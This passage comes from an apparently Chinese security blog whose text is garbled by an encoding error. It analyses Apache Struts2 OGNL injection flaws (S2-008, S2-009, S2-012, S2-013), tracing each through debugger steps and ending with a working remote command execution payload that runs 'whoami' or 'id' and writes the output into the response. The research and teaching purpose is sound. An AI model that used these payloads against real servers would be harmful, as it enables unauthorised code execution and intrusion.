<li>é¦–å…ˆçœ‹demoä¸­å¯¹Struts2çš„é»˜è®¤ç±»å‹è½¬æ¢å™¨çš„è°ƒç”¨ï¼Œå…¶é€šè¿‡xmlæ–‡ä»¶æ¥å®šä¹‰è½¬æ¢è§„åˆ™ï¼Œåœ¨ç¯å¢ƒç»™äºˆçš„demoä¸­å°±å°†ageè½¬æ¢ä¸ºintç±»å‹ï¼ŒèŒƒå›´åœ¨1-100<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141518983.png"></li>
<li>å…·ä½“æ¼æ´è§¦å‘ç‚¹å°±åœ¨<code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor</code>ä¸­ï¼Œå…ˆåœ¨å¯¹åº”ä½ç½®æ‰“å¥½æ–­ç‚¹ï¼Œç„¶åå‘èµ·è¯·æ±‚ï¼Œå°†payloadæ”¾å…¥<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141522934.png"></li>
<li>å¯ä»¥çœ‹åˆ°æ­¤å¤„çš„ä»£ç å°†è½¬æ¢å‡ºé—®é¢˜çš„å†…å®¹æ”¾å…¥äº†<code>conversionErrors</code>å˜é‡ä¸­ï¼Œå¹¶åœ¨i$è¿­ä»£å™¨ä¸­å¾ªç¯å°†å±æ€§åèµ‹å€¼ç»™propertyNameï¼Œå±æ€§å€¼èµ‹å€¼ç»™value<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141530747.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141534846.png"></li>
<li>æœ€åå¯¹fakieè¿›è¡Œçš„putæ“ä½œï¼Œæˆ‘ä»¬è·Ÿè¿›<code>getOverrideExpr</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å¯¹valueè¿›è¡Œå¤„ç†æ—¶å¯¹å­—ç¬¦ä¸²å‰ååˆ†åˆ«æ·»åŠ äº†ä¸€ä¸ªå•å¼•å·ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬çš„payloadæ˜¯è¿™ç§æ ¼å¼çš„åŸå› ï¼Œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141539863.png"></li>
<li>æœ€ç»ˆèµ°å…¥OgnlValueStackçš„setExprOverridesæ–¹æ³•ï¼Œå°†fakieèµ‹å€¼ç»™overrideså±æ€§<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141547096.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141545456.png"></li>
<li>å½“æ‹¦æˆªå™¨æ‰§è¡Œç»“æŸåä¼šå°†jspå†…å®¹è¿›è¡Œè§£æï¼Œä¼šä»OgnlValueStackçš„overrideså±æ€§ä¸­å¯»æ‰¾keyä¸ºageçš„é”®å€¼å¯¹å¹¶æ‰§è¡Œognlè¡¨è¾¾å¼</li>
</ol>
<p>payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></div></figure>


        <h2 id="282"   >
          <a href="#282" class="heading-link"><i class="fas fa-link"></i></a><a href="#282" class="headerlink" title="282"></a>282</h2>
      <p>æ¼æ´ï¼šS2-008 <em>CVE-2012-0391</em></p>
<p>æ¼æ´æˆå› ï¼šStruts2æ¡†æ¶å­˜åœ¨ä¸€ä¸ªdevmodeæ¨¡å¼,å½“devmodeæ¨¡å¼å¼€å¯æ—¶,Struts2å¯¹ä¼ å…¥çš„å‚æ•°æ²¡æœ‰ä¸¥æ ¼é™åˆ¶,å¯¼è‡´å¤šä¸ªåœ°æ–¹å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç </p>
<p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.17</p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
<li>é¦–å…ˆçœ‹å‡ºå‘ç‚¹ä½ç½®åœ¨<code>org.apache.struts2.interceptor.debugging.DebuggingInterceptor</code>ï¼Œåœ¨ç¬¬95è¡Œå¤„æ‰“æ–­ç‚¹ï¼Œè·å–åˆ°debugçš„å€¼ä¸ºcommandï¼Œè¿›å…¥else ifçš„åˆ¤æ–­ï¼ŒæŸ¥çœ‹å†…å®¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100057285.png"></li>
<li>å¯ä»¥çœ‹åˆ°è¿›å…¥äº†else ifçš„åˆ¤æ–­åå°†expressionä¼ å…¥å‚æ•°çš„å€¼åœ¨138è¡Œäº¤ç»™äº†cmdï¼Œåˆåœ¨145è¡Œé€šè¿‡<code>stack.findValue</code>æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼å¹¶å°†å›æ˜¾å†…å®¹å†™å…¥é¡µé¢<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100101557.png"></li>
</ol>
<p>æ¼æ´ä¿®å¤ï¼šåœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥é˜²æ­¢å†…å®¹æ‰§è¡Œ</p>
<p>Payloadï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=%28%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28&quot;false&quot;%29%20%2C%23context%5B&quot;xwork.MethodAccessor.denyMethodExecution&quot;%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29</span><br></pre></td></tr></table></div></figure>


        <h2 id="283"   >
          <a href="#283" class="heading-link"><i class="fas fa-link"></i></a><a href="#283" class="headerlink" title="283"></a>283</h2>
      <p>æ¼æ´ï¼šS2-009 <em>CVE-2011-3923</em></p>
<p>æ¼æ´æˆå› ï¼šStruts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åæ˜¯å¦åˆæ³•,ä¸ä¼šæ£€æŸ¥å‚æ•°å€¼ï¼Œä¾‹å¦‚ä¼ å…¥å‚æ•°<code>top[&#39;foo&#39;](0)</code>ä¼šé€šè¿‡ParametersInterceptorçš„ç™½åå•æ£€æŸ¥,OGNLä¼šå°†å…¶è§£æä¸º(top[â€˜fooâ€™])(0),å¹¶å°†fooçš„å€¼ä¹Ÿä½œä¸ºOGNLè¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ä»è€Œé€ æˆä»£ç æ‰§è¡Œ</p>
<p>å…¶å®è¿™ä¸ªæ¼æ´æ˜¯å¯¹S2-003å’ŒS2-005æ¼æ´çš„ç»•è¿‡.S2-003çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢#å·ï¼Œäºæ˜¯S2-005é€šè¿‡ä½¿ç”¨#å·çš„unicodeç¼–ç \u0023æˆ–8è¿›åˆ¶ç¼–ç \43æ¥ç»•è¿‡ï¼ŒStruts2å¯¹S2-005çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢\ç­‰ç‰¹æ®Šç¬¦å·ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡Struts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åè€Œä¸æ£€æŸ¥å‚æ•°å€¼çš„æ–¹å¼è¿›è¡Œæ„é€ OGNLè¡¨è¾¾å¼ä»è€Œé€ æˆä»£ç æ‰§è¡Œ</p>
<p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.1</p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
<li>æµç¨‹ä¸S2-005åŸºæœ¬ç›¸åŒï¼Œè·³è¿‡åˆ†æï¼Œç›´æ¥åˆ†æpayload</li>
<li>å½“æœ‰å½¢ä¼¼(one)(two)çš„å˜é‡æ—¶ï¼Œoneä¼šè¢«å½“ä½œä¸€ä¸ªOGNLè¡¨è¾¾å¼å»è®¡ç®—ï¼Œç„¶åæŠŠå®ƒçš„ç»“æœå½“ä½œå¦ä¸€ä¸ªä»¥twoä¸ºæ ¹å¯¹è±¡çš„OGNLè¡¨è¾¾å¼å†ä¸€æ¬¡è®¡ç®—ï¼Œæ‰€ä»¥ï¼Œå¦‚æœoneæœ‰è¿”å›å†…å®¹ï¼Œé‚£ä¹ˆè¿™äº›å†…å®¹å°†ä¼šè¢«å½“ä½œOGNLè¯­å¥è¢«è®¡ç®—ï¼Œè€Œpayloadç»“å°¾ä¼ å…¥çš„<code>z[(name)(%27meh%27)]</code>å°±æ˜¯ä¸ºäº†æŠŠnameå‚æ•°çš„å€¼å½“ä½œOGNLè¡¨è¾¾å¼è®¡ç®—</li>
</ol>
<p>payloadï¼š</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?age=<span class="number">12313</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>]=+<span class="keyword">new</span>+java.lang.Boolean(<span class="keyword">false</span>),+%23_memberAccess[%22allowStaticMethodAccess%<span class="number">22</span>]=<span class="keyword">true</span>,+%23a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%27whoami%<span class="number">27</span>).getInputStream(),%23b=<span class="keyword">new</span>+java.io.InputStreamReader(%23a),%23c=<span class="keyword">new</span>+java.io.BufferedReader(%23b),%<span class="number">23d</span>=<span class="keyword">new</span>+<span class="keyword">char</span>[<span class="number">51020</span>],%23c.read(%<span class="number">23d</span>),%23kxlzx=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),%23kxlzx.println(%<span class="number">23d</span>),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%<span class="number">27</span>)] </span><br></pre></td></tr></table></div></figure>


        <h2 id="284"   >
          <a href="#284" class="heading-link"><i class="fas fa-link"></i></a><a href="#284" class="headerlink" title="284"></a>284</h2>
      <p>æ¼æ´ï¼šS2-012 <em>CVE-2013-1965</em></p>
<p>æ¼æ´æˆå› ï¼šåœ¨Struts2æ¡†æ¶ä¸­ï¼Œå¦‚æœé…ç½®Actionä¸­çš„Resultæ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨${param_name}ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œå½“è§¦å‘redirectç±»å‹è¿”å›æ—¶ï¼ŒStruts2ä½¿ç”¨${param_name}è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹nameå‚æ•°çš„å€¼æ‰§è¡ŒOGNLè¡¨è¾¾å¼è§£æ,ä»è€Œå¯ä»¥æ’å…¥ä»»æ„OGNLè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p>
<p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.14.2</p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
<li><p>é¦–å…ˆè¿˜æ˜¯æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­ä½¿ç”¨äº†redirectæ–¹æ³•å¹¶ä¸”è¿”å›å€¼ä¸­ä½¿ç”¨äº†${name}å–å€¼ï¼Œå­˜åœ¨æ¼æ´è§¦å‘æ¡ä»¶<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142228174.png"></p>
</li>
<li><p>åœ¨<code>com.opensymphony.xwork2.DefaultActionInvocation</code>ç±»ä¸­æ‰“æ–­ç‚¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142230130.png"></p>
</li>
<li><p>æ­¥å…¥æ–¹æ³•ï¼ŒcreateResultæ–¹æ³•ä¼šæ ¹æ®actionçš„è¿”å›å€¼è·å–å¯¹åº”çš„resultæ ‡ç­¾é…ç½®ï¼Œç„¶åä¼ å…¥åˆ°buildResultæ–¹æ³•ä¸­ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ç”Ÿæˆå¯¹åº”çš„Resultå®ç°ç±»ï¼Œä¹Ÿå°±æ˜¯<code>org.apache.struts2.dispatcher.ServletRedirectResult</code>ç±»ï¼Œå¹¶æŠŠå¯¹åº” resultæ ‡ç­¾çš„å€¼/index.jsp?name=${name}è®¾ç½®ç»™ServletRedirectResult ç±»çš„locationå±æ€§ï¼Œç„¶åè¿”å›ServletRedirectResult<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322880.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322785.png"></p>
</li>
<li><p>ç„¶åè¿”å›åˆ°executeResultæ–¹æ³•ä¸­ç»§ç»­æ‰§è¡Œï¼Œè¿›å…¥åˆ°<code>this.result.execute</code>ä¸­ï¼ŒæŸ¥çœ‹resultå°±æ˜¯ServletRedirectResultç±»å‹ï¼Œæ­¥å…¥å‘ç°å…¶æ‰§è¡Œäº†superçš„executeæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥conditionalParseæ–¹æ³•ï¼Œå‘ç°å…¶æ‰§è¡Œäº†S2-001ä¸­åŒåå…³é”®æ–¹æ³•translateVariablesï¼Œå¹¶ä¸”é€šè¿‡é‡è½½èƒ½çœ‹åˆ°é™åˆ¶äº†å¾ªç¯æ¬¡æ•°æœ€é«˜ä¸º1ï¼Œè¿™å°±æ˜¯å¯¹S2-001çš„æ¼æ´ä¿®å¤<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142328950.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142334539.png"></p>
</li>
<li><blockquote>
<p>å¯¹äºS2-001æ¼æ´,å®˜æ–¹è®¾ç½®äº†å¾ªç¯æ¬¡æ•°,ä»è€Œé™åˆ¶æ¶æ„ä»£ç ,ä½†è¿™ä¸ªè®¾ç½®çš„å¾ªç¯æ¬¡æ•°æ˜¯é’ˆå¯¹çš„whileå¾ªç¯,åœ¨å¤–é¢è¿˜æœ‰ä¸€ä¸ªforå¾ªç¯,forå¾ªç¯å¼€å§‹çš„poså‚æ•°ç”¨æ¥è·å–expressionè¡¨è¾¾å¼çš„å¼€å§‹ä½ç½®,æ¯”å¦‚è§£æå®Œäº†%{password}çš„å€¼,ä¸‹ä¸€æ¬¡è§£ææ˜¯ä»%{password}åé¢å¼€å§‹.åœ¨S2-001çš„ä¿®å¤ä¸­å®ƒè¢«æ”¾åœ¨äº†forå¾ªç¯é‡Œ,å¯¼è‡´ç¬¬äºŒæ¬¡forå¾ªç¯æ—¶posçš„å€¼ä¼šè¢«é‡ç½®ä¸º0.ä»è€Œåˆä»å¤´å¼€å§‹è§£æ.ä»ä¸‹å›¾ä¸­çš„å˜é‡å€¼å¯ä»¥çœ‹åˆ°forè¿›è¡Œäº†2æ¬¡å¾ªç¯,å¾ªç¯2æ¬¡æ˜¯å› ä¸ºä¼ å…¥çš„å‚æ•°new char[]{â€˜$â€™, â€˜%â€™}é•¿åº¦ä¸º2å¯¼è‡´çš„.forç¬¬äºŒæ¬¡å¾ªç¯æ—¶openä¸ºarræ•°ç»„çš„ç¬¬äºŒä¸ªå‚æ•°%,è¿™ä¸ª%å’Œ{ç»„åˆååˆæˆäº†S2-001çš„åˆ©ç”¨æ‰€éœ€è¦çš„æ¡ä»¶,æœ€åè¿˜æ˜¯é€šè¿‡whileå¾ªç¯ä¸­çš„stack.findValueæ¥è¿›è¡Œæ‰§è¡Œä»£ç çš„.S2-001ä¿®å¤æ–¹æ¡ˆä¸­çš„å¢åŠ loopCountå˜é‡é™åˆ¶äº†whileå¾ªç¯çš„æ¬¡æ•°,å´æ²¡æœ‰é™åˆ¶forå¾ªç¯çš„æ¬¡æ•°,æ¯æ¬¡forå¾ªç¯å¼€å§‹æ—¶loopCountéƒ½ä¼šè¢«é‡ç½®ä¸º1.</p>
</blockquote>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142337790.png"></p>
</li>
</ol>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="285"   >
          <a href="#285" class="heading-link"><i class="fas fa-link"></i></a><a href="#285" class="headerlink" title="285"></a>285</h2>
      <p>æ¼æ´ï¼šS2-013 <em>CVE-2013-1966</em></p>
<p>æ¼æ´æˆå› ï¼šåœ¨Struts2æ ‡ç­¾ä¸­å’Œéƒ½åŒ…å«ä¸€ä¸ªincludeParamså±æ€§ï¼Œå…¶å€¼å¯è®¾ç½®ä¸ºnoneã€get æˆ– allï¼Œå…¶å¯¹åº”æ„ä¹‰åˆ†åˆ«ä¸ºï¼šnone:é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼(é»˜è®¤)ï¼Œget:é“¾æ¥åªåŒ…å«GETè¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼ï¼Œall:é“¾æ¥åŒ…å«GETå’ŒPOSTæ‰€æœ‰å‚æ•°å’Œå…¶å€¼ï¼Œç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªè¶…é“¾æ¥,å½“includeParams=allçš„æ—¶å€™ï¼Œä¼šå°†æœ¬æ¬¡è¯·æ±‚çš„GETå’ŒPOSTå‚æ•°éƒ½æ”¾åœ¨URLçš„GETå‚æ•°ä¸Šï¼Œè¿™ä¸ªå‚æ•°ä¼šè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„OGNLè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p>
<p>å½±å“ç‰ˆæœ¬ï¼š<em>Struts 2.0.0 - Struts 2.3.14.1</em></p>
<p>æ¼æ´åˆ†æï¼š</p>
<ol>
<li>çœ‹é…ç½®æ–‡ä»¶ï¼ŒincludeParamså±æ€§ä¸ºall<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150147876.png"></li>
<li><code>org.apache.struts2.components.ComponentUrlProvider</code>æ‰“æ–­ç‚¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150209394.png"></li>
<li>è·Ÿå…¥beforeRenderUrlå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è·å–äº†urlæ‰€ä¼ é€’çš„å‚æ•°å¯ä»¥çœ‹åˆ°includeParamså‚æ•°ä¸ºallï¼Œæ­¤å¤„çš„mergeRequestParametersè·å–åˆ°äº†urlä¸­ä¼ é€’çš„å‚æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209151820358.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161613470.png"></li>
<li>æ­¥è¿‡æ‰§è¡Œç›´åˆ°endå‡½æ•°ï¼Œç»§ç»­æ­¥å…¥renderUrlå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬èƒ½çœ‹åˆ°æˆ‘ä»¬çš„payloadå·²ç»è¢«æ”¾å…¥åˆ°äº†urlComponentçš„paramterså±æ€§ä¸­ï¼Œç»§ç»­è·Ÿå…¥determineActionURLå‡½æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161706306.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161709860.png"></li>
<li>è¿›å…¥åˆ°é‡è½½å‡½æ•°determineActionURLï¼Œæ‰§è¡Œåˆ°æœ€åå‘ç°æˆ‘ä»¬payloadå‰åŠæ®µå·²ç»è¢«è¢«æ‰§è¡Œï¼ŒactionMapperä¸­çš„allowDynamicMethodCallså±æ€§å·²ç»å˜ä¸ºtrueï¼Œç»§ç»­è·Ÿå…¥buildUrlæ–¹æ³•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161712049.png"></li>
<li>æ­¥è¿‡åˆ°buildParametersStringï¼Œæ­¥å…¥è¯¥å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„urlå’Œå‚æ•°è¢«ä¼ å…¥å…¶ä¸­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161714673.png"></li>
<li>è¿›å…¥åˆ°é‡è½½æ–¹æ³•ä¸­ï¼Œæ‰§è¡Œç›´åˆ°166è¡ŒbuildParameterSubstringå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„payloadå·²ç»è¢«ä¼ å…¥å…¶ä¸­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161717072.png"></li>
<li>ç»§ç»­è·Ÿå…¥translateAndEncodeå‡½æ•°ï¼Œè·Ÿå…¥translateVariableå‡½æ•°ï¼Œå¯ä»¥å‘ç°valueStackå‡ºç°äº†<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161718405.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161719376.png"></li>
<li>ç»§ç»­è·Ÿå…¥å°±æ˜¯translateVariableså‡½æ•°äº†ï¼ŒOGNLè¡¨è¾¾å¼åœ¨è¿™é‡Œè¢«æ‰§è¡Œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161720361.png"></li>
</ol>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%24%7B%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D </span><br></pre></td></tr></table></div></figure>



















<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">ç”Ÿå‘½ä¸æ¯ï¼ŒæŠ˜è…¾ä¸æ­¢ï¼</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="å¾®ä¿¡" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">65</div><div class="sidebar-ov-state-item__name">å½’æ¡£</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">æ ‡ç­¾</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Jlan</span></div><div><span>ç”± <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> å¼ºåŠ›é©±åŠ¨</span><span> v6.0.0</span><span class="footer__devider">|</span><span>ä¸»é¢˜ - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">è®¿é—®äººæ•°</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">æµè§ˆæ€»é‡</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>å·²ç»æ˜¯Dest0g3çš„èœç‹—äº†</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="æœç´¢æ–‡ç« ï¼ˆæ”¯æŒå¤šå…³é”®è¯ï¼Œè¯·ç”¨ç©ºæ ¼åˆ†éš”ï¼‰"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ æ–‡ç« æ— æ ‡é¢˜ ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
